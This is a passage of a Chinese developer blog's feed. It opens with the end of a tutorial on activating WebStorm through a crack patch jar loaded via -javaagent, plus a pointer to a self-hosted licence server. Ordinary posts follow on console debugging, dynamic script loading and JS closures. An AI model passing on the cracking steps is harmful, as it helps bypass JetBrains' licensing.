<p><img src="https://upload-images.jianshu.io/upload_images/10024246-808ac27a6bfb9377.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>然后将补丁复制到安装目录的bin目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:\...\WebStorm\bin</span><br></pre></td></tr></table></figure>

<p>PS：一定要把这个jar包复制到这个bin目录，不然后面操作可能无法进行。</p>
<p>修改同目录下的 WebStorm.exe.vmoptions 和WebStorm64.exe.vmoptions，这两个文件一个是32位的，一个是64位的，建议同步修改。</p>
<p>用文本编辑器打开之后，在文件最上面加一行代码 ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-javaagent:D:&#x2F;Program Files (x86)&#x2F;JetBrains&#x2F;WebStorm&#x2F;bin&#x2F;破解补丁名字.jar</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-b1701a3f06a92ab8?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这里写图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置好之后，保存文件。在此再次启动WebStorm，就会看到下面所示界面，至此补丁激活就成功了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-d41d37b270730a54?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这里写图片描述"></p>
<p><strong>方法四:自己搭建IntelliJ IDEA授权服务器</strong></p>
<hr>
<p>这个比较繁琐,喜欢折腾的人可以试试:</p>
<p>IntelliJ IDEA License Server本地搭建教程</p>
<p><a href="http://blog.lanyus.com/archives/174.html">ilanyu’s大牛的博客里有详细的步骤</a></p>
<p>如果有更好的方法,欢迎留言交流。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>修复image在hexo自建博客显示403</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E4%BF%AE%E5%A4%8Dimage%E5%9C%A8hexo%E8%87%AA%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%98%BE%E7%A4%BA403/</url>
    <content><![CDATA[<p>使用hexo自建个人博客，本地localhost Debug的时候完全可以显示，但是将网站部署到服务器后就会图片全部无法显示，遇到这样的错误<br>打开google开发者工具<br>可以看到，加载图片时显示403<br><img src="https://upload-images.jianshu.io/upload_images/10024246-21238a83cbe055a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>解决方案：利用html中的meta标签关闭浏览器的UrlReferer<br>访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">themes&#x2F;next(主题)&#x2F;layout&#x2F;_partials&#x2F;head&#x2F;head.njk</span><br></pre></td></tr></table></figure>
<p>在里面的<head></head>中添加下面代码即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>前端实用的调试命令console使用</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%94%A8%E7%9A%84%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4console%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="一、显示信息的命令"><a href="#一、显示信息的命令" class="headerlink" title="一、显示信息的命令"></a>一、显示信息的命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(&#39;hello&#39;); </span><br><span class="line">console.info(&#39;信息&#39;);</span><br><span class="line">console.error(&#39;错误&#39;);</span><br><span class="line">console.warn(&#39;警告&#39;);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1ed692616e9ad924.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>最常用的就是console.log了。</p>
<h2 id="二：占位符"><a href="#二：占位符" class="headerlink" title="二：占位符"></a>二：占位符</h2><p>console支持printf的占位符格式，支持的占位符有：字符（%s）、整数（%d或%i）、浮点数（%f）和对象（%o），</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(&quot;%d年%d月%d日&quot;,2018,04,08);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ec167f3d362eae60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="三：颜色"><a href="#三：颜色" class="headerlink" title="#三：颜色"></a>#三：颜色</h2><p>console支持打印是显示不同文字，甚至图片，%c:css样式(部分浏览器不支持)</p>
<p>%c：Formats the output string according to CSS styles you provide.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(&quot;%c3D Text&quot;,&quot; text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em&quot;)</span><br><span class="line">console.log(&quot;%cColorful CSS&quot;,&quot;background: rgba(252,234,187,1);background: -moz-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%,rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -webkit-gradient(left top, right top, color-stop(0%, rgba(252,234,187,1)), color-stop(12%, rgba(175,250,77,1)), color-stop(28%, rgba(0,247,49,1)), color-stop(39%, rgba(0,210,247,1)), color-stop(51%, rgba(0,189,247,1)), color-stop(64%, rgba(133,108,217,1)), color-stop(78%, rgba(177,0,247,1)), color-stop(87%, rgba(247,0,189,1)), color-stop(100%, rgba(245,22,52,1)));background: -webkit-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -o-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -ms-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: linear-gradient(to right, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr&#x3D;&#39;#fceabb&#39;, endColorstr&#x3D;&#39;#f51634&#39;, GradientType&#x3D;1 );font-size:5em&quot;)</span><br><span class="line">console.log(&quot;%c&quot;, &quot;padding:50px 300px;line-height:120px;background:url(&#39;https:&#x2F;&#x2F;cdn2.jianshu.io&#x2F;assets&#x2F;web&#x2F;nav-logo-4c7bbafe27adc892f3046e6978459bac.png&#39;) no-repeat;&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-6a5b5b1cea9583ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="四：信息分组"><a href="#四：信息分组" class="headerlink" title="四：信息分组"></a>四：信息分组</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.group(&quot;第一组信息&quot;);</span><br><span class="line">	console.log(&quot;group1：test1&quot;);</span><br><span class="line">	console.log(&quot;group1：test2&quot;);</span><br><span class="line">console.groupEnd();</span><br><span class="line"></span><br><span class="line">console.group(&quot;第二组信息&quot;);</span><br><span class="line">	console.log(&quot;group2：test1&quot;);</span><br><span class="line">	console.log(&quot;group2：test2&quot;);</span><br><span class="line">console.groupEnd();</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-cced9b0810322c01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="五：查看对象的信息"><a href="#五：查看对象的信息" class="headerlink" title="五：查看对象的信息"></a>五：查看对象的信息</h2><p>console.dir()可以显示一个对象所有的属性和方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var test &#x3D;&#123;</span><br><span class="line">  name:&#39;test&#39;,</span><br><span class="line">  age:18,</span><br><span class="line">  des:&#39;I am Test&#39;,</span><br><span class="line">  fn:function()&#123;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.dir(test);</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a299eabfd7a933ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="六：显示Html页面节点内容"><a href="#六：显示Html页面节点内容" class="headerlink" title="六：显示Html页面节点内容"></a>六：显示Html页面节点内容</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">      &lt;title&gt;console.dirxml()&lt;&#x2F;title&gt;</span><br><span class="line">      &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">      &lt;div id&#x3D;&quot;TZA4S&quot;&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;&quot; id&#x3D;&quot;lga&quot;&gt;</span><br><span class="line">                &lt;img style&#x3D;&quot;padding-top:112px&quot; height&#x3D;&quot;92&quot; src&#x3D;&quot;&#x2F;images&#x2F;branding&#x2F;googlelogo&#x2F;2x&#x2F;googlelogo_color_272x92dp.png&quot; width&#x3D;&quot;272&quot; alt&#x3D;&quot;Google&quot; id&#x3D;&quot;hplogo&quot; title&#x3D;&quot;Google&quot; onload&#x3D;&quot;typeof google&#x3D;&#x3D;&#x3D;&#39;object&#39;&amp;&amp;google.aft&amp;&amp;google.aft(this)&quot;&gt;</span><br><span class="line">          &lt;&#x2F;div&gt;      </span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">       var info &#x3D; decument.getElementById(&#39;TZA4S&#39;);</span><br><span class="line">       console.dirxml(info);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-72be280b8126019e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="七：断言判断数据或结果"><a href="#七：断言判断数据或结果" class="headerlink" title="七：断言判断数据或结果"></a>七：断言判断数据或结果</h2><p>console.assert()用来判断一个表达式或变量是否为真。如果结果为否，则在控制台输出一条相应信息，并且抛出一个异常。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result &#x3D; 1; </span><br><span class="line">console.assert( result );</span><br><span class="line">var age &#x3D; 18; </span><br><span class="line">console.assert(age &#x3D;&#x3D;&#x3D; &#39;18&#39; );</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-779b2a8a366f9c5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="八：打印函数调用的栈信息"><a href="#八：打印函数调用的栈信息" class="headerlink" title="八：打印函数调用的栈信息"></a>八：打印函数调用的栈信息</h2><p>调试JavaScript程序时，有时需要打印函数调用的栈信息，这可以通过使用console.trace()来实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function doTask()&#123;</span><br><span class="line">    doSubTask(1000,10000);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function doSubTask(countX,countY)&#123;</span><br><span class="line">    for(var i&#x3D;0;i&lt;countX;i++)&#123;</span><br><span class="line">        for(var j&#x3D;0;j&lt;countY;j++)&#123;&#125; </span><br><span class="line">    &#125;</span><br><span class="line">    console.trace();</span><br><span class="line">&#125;</span><br><span class="line">doTask();</span><br></pre></td></tr></table></figure>
<p>  <img src="https://upload-images.jianshu.io/upload_images/10024246-5b43a7ab562c5959.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="九：测量程序消耗的时间"><a href="#九：测量程序消耗的时间" class="headerlink" title="九：测量程序消耗的时间"></a>九：测量程序消耗的时间</h2><p>console.time和console.timeEnd这两个方法可以用来让WEB开发人员测量一个javascript脚本程序执行消耗的时间。</p>
<p>console.time方法是开始计算时间，console.timeEnd是停止计时，输出脚本执行的时间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.time(&#39;计时统计：begin&#39;)</span><br><span class="line">for(var i&#x3D;0;i&lt;1000;i++)&#123;</span><br><span class="line">  for(var j&#x3D;0;j&lt;1000;j++)&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line">console.timeEnd(&#39;计时统计：begin&#39;)</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1e26129602eed7dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>注意:开始和结束的描述会一直，不然会无法统计，并报警：Timer ‘begin’ does not exist<br>本地测试结果如下，但是多尝试几次之后，发现其实每次执行的结果略微会有点误差，而且总体次数越多时间越快。<br>原因：很多程序、进程、线程都由操作系统控制，会影响执行时间。</p>
</blockquote>
<p>还有计时工具performance.now()，node测试代码执行时间process.hrtime();</p>
<h2 id="十：性能分析"><a href="#十：性能分析" class="headerlink" title="十：性能分析"></a>十：性能分析</h2><p>性能分析（Profiler）就是分析程序各个部分的运行时间，找出瓶颈所在，使用的方法是console.profile()。<br>console.profile()的使用非常简单：在需要开始profile的地方插入console.profile()，在结束profile的地方插入console.profileEnd()即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function doTask()&#123;</span><br><span class="line">    doSubTaskA(1000);</span><br><span class="line">    doSubTaskA(100000);</span><br><span class="line">    doSubTaskB(10000);</span><br><span class="line">    doSubTaskC(1000,10000);</span><br><span class="line">&#125;</span><br><span class="line">function doSubTaskA(count)&#123;</span><br><span class="line">    for(var i&#x3D;0;i&lt;count;i++)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function doSubTaskB(count)&#123;</span><br><span class="line">    for(var i&#x3D;0;i&lt;count;i++)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function doSubTaskC(countX,countY)&#123;</span><br><span class="line">    for(var i&#x3D;0;i&lt;countX;i++)&#123;</span><br><span class="line">        for(var j&#x3D;0;j&lt;countY;j++)&#123;&#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.profile();</span><br><span class="line">doTask();</span><br><span class="line">console.profileEnd();</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a0a1594caf107dfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>动态加载JS过程中如何判断JS加载完成</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDJS%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADJS%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90/</url>
    <content><![CDATA[<p>在正常的加载过程中，js文件的加载是同步的，也就是说在js加载的过程中，浏览器会阻塞接下来的内容的解析。这时候，动态加载便显得尤为重要了，由于它是异步加载，因此，它可以在后台自动下载，并不会妨碍其它内容的正常解析，由此，便可以提高页面首次加载的速度。</p>
<p>那么，既然js是异步加载，我们又该如何判断它是否加载完成呢？</p>
<p>在IE或一些基于IE内核的浏览器中（如Maxthon）,它是通过script节点的readystatechange方法来判断的，而其它的一些浏览器中，往往是通过load事件来决定的，如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function dynamicLoad() &#123;</span><br><span class="line">    var _doc &#x3D; document.getElementsByTagName(&#39;head&#39;)[0];</span><br><span class="line">    var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">    script.setAttribute(&#39;type&#39;, &#39;text&#x2F;javascript&#39;);</span><br><span class="line">    script.setAttribute(&#39;src&#39;, &#39;jquery-1.4.4.js&#39;);</span><br><span class="line">    script.onload &#x3D; script.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">        if (!this.readyState || this.readyState &#x3D;&#x3D; &#39;loaded&#39; || this.readyState &#x3D;&#x3D; &#39;complete&#39;) &#123;</span><br><span class="line">            alert(&#39;done&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        script.onload &#x3D; script.onreadystatechange &#x3D; null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们把该方法添加到body的load事件中，<body onload='dynamicLoad()'>，运行，会发现IE或Maxthon中，会弹出‘done’对话框，但是firefox或chrome中却完全没有反应，why?</p>
<p>这是因为，如果script节点没有添加到DOM树中，那么在chrome和firefox中是不会响应script的load事件的。但是IE中却可以。。修改后如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function dynamicLoad() &#123;</span><br><span class="line">    var _doc &#x3D; document.getElementsByTagName(&#39;head&#39;)[0];</span><br><span class="line">    var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">    script.setAttribute(&#39;type&#39;, &#39;text&#x2F;javascript&#39;);</span><br><span class="line">    script.setAttribute(&#39;src&#39;, &#39;jquery-1.4.4.js&#39;);</span><br><span class="line">    _doc.appendChild(script);</span><br><span class="line">    script.onload &#x3D; script.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">        if (!this.readyState || this.readyState &#x3D;&#x3D; &#39;loaded&#39; || this.readyState &#x3D;&#x3D; &#39;complete&#39;) &#123;</span><br><span class="line">            alert(&#39;done&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        script.onload &#x3D; script.onreadystatechange &#x3D; null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这时候，所有的浏览器都可以响应，你可以尝试一下~</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>大部分人都会做错的经典JS闭包面试题</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%A4%A7%E9%83%A8%E5%88%86%E4%BA%BA%E9%83%BD%E4%BC%9A%E5%81%9A%E9%94%99%E7%9A%84%E7%BB%8F%E5%85%B8JS%E9%97%AD%E5%8C%85%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<p><strong>由工作中演变而来的面试题</strong></p>
<p>这是一个我工作当中的遇到的一个问题，似乎很有趣，就当做了一道题去面试，发现几乎没人能全部答对并说出原因，遂拿出来聊一聊吧。</p>
<p>先看题目代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function fun(n,o) &#123;</span><br><span class="line">  console.log(o)</span><br><span class="line">  return &#123;</span><br><span class="line">    fun:function(m)&#123;</span><br><span class="line">      return fun(m,n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var a &#x3D; fun(0);  a.fun(1);  a.fun(2);  a.fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br><span class="line">var b &#x3D; fun(0).fun(1).fun(2).fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br><span class="line">var c &#x3D; fun(0).fun(1);  c.fun(2);  c.fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br><span class="line">&#x2F;&#x2F;问:三行a,b,c的输出分别是什么？</span><br></pre></td></tr></table></figure>

<p>这是一道非常典型的JS闭包问题。其中嵌套了三层fun函数，搞清楚每层fun的函数是那个fun函数尤为重要。</p>
<p>可以先在纸上或其他地方写下你认为的结果，然后展开看看正确答案是什么？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;答案：</span><br><span class="line">&#x2F;&#x2F;a: undefined,0,0,0</span><br><span class="line">&#x2F;&#x2F;b: undefined,0,1,2</span><br><span class="line">&#x2F;&#x2F;c: undefined,0,1,1</span><br></pre></td></tr></table></figure>

<p>都答对了么？如果都答对了恭喜你在js闭包问题当中几乎没什么可以难住你了；如果没有答对，继续往下分析。</p>
<p><strong>JS中有几种函数</strong></p>
<p>首先，在此之前需要了解的是，在JS中函数可以分为两种，<strong>具名函数（命名函数）和匿名函数。</strong></p>
<p>区分这两种函数的方法非常简单，可以通过输出 <code>fn.name</code> 来判断，有name的就是具名函数，没有name的就是匿名函数</p>
<blockquote>
<p>注意：在低版本IE上无法获取具名函数的name，会返回undefined，建议在火狐或是谷歌浏览器上测试</p>
</blockquote>
<p>或是采用兼容IE的获取函数name方法来获取函数名称：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">    * 获取指定函数的函数名称（用于兼容IE）</span><br><span class="line">    * @param &#123;Function&#125; fun 任意函数</span><br><span class="line">    *&#x2F;</span><br><span class="line">function getFunctionName(fun) &#123;</span><br><span class="line">    if (fun.name !&#x3D;&#x3D; undefined)</span><br><span class="line">        return fun.name;</span><br><span class="line">    var ret &#x3D; fun.toString();</span><br><span class="line">    ret &#x3D; ret.substr(&#39;function &#39;.length);</span><br><span class="line">    ret &#x3D; ret.substr(0, ret.indexOf(&#39;(&#39;));</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遂用上述函数测试是否为匿名函数：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7cfa3bd5bd1ed4d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="大部分人都会做错的经典JS闭包面试题_"></p>
<p>可以得知变量fn1是具名函数，fn2是匿名函数</p>
<p><strong>创建函数的几种方式</strong></p>
<p>说完函数的类型，还需要了解JS中创建函数都有几种创建方法。</p>
<p><strong>1、声明函数</strong></p>
<p>最普通最标准的声明函数方法，包括函数名及函数体。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function fn1()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2、创建匿名函数表达式</strong></p>
<p>创建一个变量，这个变量的内容为一个函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fn1&#x3D;function ()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>注意采用这种方法创建的函数为<strong>匿名函数</strong>，即没有函数<code>name</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fn1&#x3D;function ()&#123;&#125;;</span><br><span class="line">getFunctionName(fn1).length;&#x2F;&#x2F;0</span><br></pre></td></tr></table></figure>

<p><strong>3、创建具名函数表达式</strong></p>
<p>创建一个变量，内容为一个带有名称的函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fn1&#x3D;function xxcanghai()&#123;&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>具名函数表达式的函数名只能在创建函数内部使用</p>
<p>即采用此种方法创建的函数在函数外层只能使用fn1不能使用xxcanghai的函数名。xxcanghai的命名只能在创建的函数内部使用</p>
<p>测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fn1&#x3D;function xxcanghai()&#123;</span><br><span class="line">    console.log(&quot;in:fn1&lt;&quot;,typeof fn1,&quot;&gt;xxcanghai:&lt;&quot;,typeof xxcanghai,&quot;&gt;&quot;);</span><br><span class="line">&#125;;</span><br><span class="line">console.log(&quot;out:fn1&lt;&quot;,typeof fn1,&quot;&gt;xxcanghai:&lt;&quot;,typeof xxcanghai,&quot;&gt;&quot;);</span><br><span class="line">fn1();</span><br><span class="line">&#x2F;&#x2F;out:fn1&lt; function &gt;xxcanghai:&lt; undefined &gt;</span><br><span class="line">&#x2F;&#x2F;in:fn1&lt; function &gt;xxcanghai:&lt; function &gt;</span><br></pre></td></tr></table></figure>

<p>可以看到在函数外部（out）无法使用xxcanghai的函数名，为undefined。</p>
<blockquote>
<p>注意：在对象内定义函数如<code>var o=&#123; fn : function ()&#123;…&#125; &#125;</code>，也属于函数表达式</p>
</blockquote>
<p><strong>4、Function构造函数</strong></p>
<p>可以给 <code>Function</code> 构造函数传一个函数字符串，返回包含这个字符串命令的函数，此种方法创建的是匿名函数。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9d9729d1b2516248.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="大部分人都会做错的经典JS闭包面试题_"></p>
<p><strong>5、自执行函数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function()&#123;alert(1);&#125;)();</span><br><span class="line">(function fn1()&#123;alert(1);&#125;)();</span><br></pre></td></tr></table></figure>

<p>自执行函数属于上述的“函数表达式”，规则相同</p>
<p><strong>6、其他创建函数的方法</strong></p>
<p>当然还有其他创建函数或执行函数的方法，这里不再多说，比如采用 <code>eval</code> ， <code>setTimeout</code>， <code>setInterval</code> 等非常用方法，这里不做过多介绍，属于非标准方法，这里不做过多展开。</p>
<p><strong>三个fun函数的关系是什么？</strong></p>
<p>说完函数类型与创建函数的方法后，就可以回归主题，看这道面试题。</p>
<p>这段代码中出现了三个fun函数，所以第一步先搞清楚，这三个fun函数的关系，哪个函数与哪个函数是相同的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function fun(n,o) &#123;</span><br><span class="line">  console.log(o)</span><br><span class="line">  return &#123;</span><br><span class="line">    fun:function(m)&#123;</span><br><span class="line">      &#x2F;&#x2F;...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看第一个fun函数，属于标准具名函数声明，是<strong>新创建</strong>的函数，他的返回值是一个对象字面量表达式，属于一个新的object。</p>
<p>这个新的对象内部包含一个也叫fun的属性，通过上述介绍可得知，属于匿名函数表达式，即fun这个属性中存放的是一个新创建匿名函数表达式。</p>
<blockquote>
<p>注意：所有<strong>声明的匿名函数都是一个新函数。</strong></p>
</blockquote>
<p>所以第一个fun函数与第二个fun函数不相同，均为新创建的函数。</p>
<p><strong>函数作用域链的问题</strong></p>
<p>再说第三个fun函数之前需要先说下，在函数表达式内部能不能访问存放当前函数的变量。</p>
<p><strong>测试1，对象内部的函数表达式：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var o&#x3D;&#123;</span><br><span class="line">  fn:function ()&#123;</span><br><span class="line">    console.log(fn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">o.fn();&#x2F;&#x2F;ERROR报错</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4cebded6d66af53a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="大部分人都会做错的经典JS闭包面试题_"></p>
<p><strong>测试2，非对象内部的函数表达式：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fn&#x3D;function ()&#123;</span><br><span class="line">  console.log(fn);</span><br><span class="line">&#125;;</span><br><span class="line">fn();&#x2F;&#x2F;function ()&#123;console.log(fn);&#125;;正确</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-511856047d0d46e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="大部分人都会做错的经典JS闭包面试题_"></p>
<p>结论是：使用var或是非对象内部的函数表达式内，可以访问到存放当前函数的变量；在对象内部的不能访问到。</p>
<p>原因也非常简单，因为<strong>函数作用域链</strong>的问题，采用var的是在外部创建了一个fn变量，函数内部当然可以在内部寻找不到fn后向上册作用域查找fn，而在创建对象内部时，因为没有在函数作用域内创建fn，所以无法访问。</p>
<p>所以综上所述，可以得知，<strong>最内层的return出去的fun函数不是第二层fun函数，是最外层的fun函数。</strong></p>
<p>所以，三个fun函数的关系也理清楚了，第一个等于第三个，他们都不等于第二个。</p>
<p><strong>到底在调用哪个函数？</strong></p>
<p>再看下原题，现在知道了程序中有两个fun函数(第一个和第三个相同)，遂接下来的问题是搞清楚，运行时他执行的是哪个fun函数？</p>
